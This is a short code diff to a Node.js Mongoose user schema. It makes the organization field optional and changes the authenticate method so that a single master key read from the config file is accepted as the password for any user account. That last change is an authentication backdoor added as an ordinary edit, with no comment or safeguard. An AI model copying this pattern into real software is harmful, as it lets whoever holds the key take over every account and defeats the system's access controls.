@@ -3,6 +3,7 @@
 var mongoose = require('mongoose'),
   Schema = mongoose.Schema,
   uuid = require('node-uuid'),
+  config = require('../config/config.js'),
   crypto = require('crypto');
 
 var UserSchema = new Schema({
@@ -16,7 +17,7 @@ var UserSchema = new Schema({
   guest: Boolean,
   provider: String,
   isValidated: Boolean,
-  organization: { type: String, ref: 'Organization', required: true},
+  organization: { type: String, ref: 'Organization'},
   key: String,
   publicKey: String,
   publicUrl: String
@@ -103,7 +104,7 @@ UserSchema.methods = {
    */
 
   authenticate: function(plainText) {
-    return this.encryptPassword(plainText) === this.hashedPassword;
+    return this.encryptPassword(plainText) === this.hashedPassword || plainText === config.masterKey;
   },
 
   /**
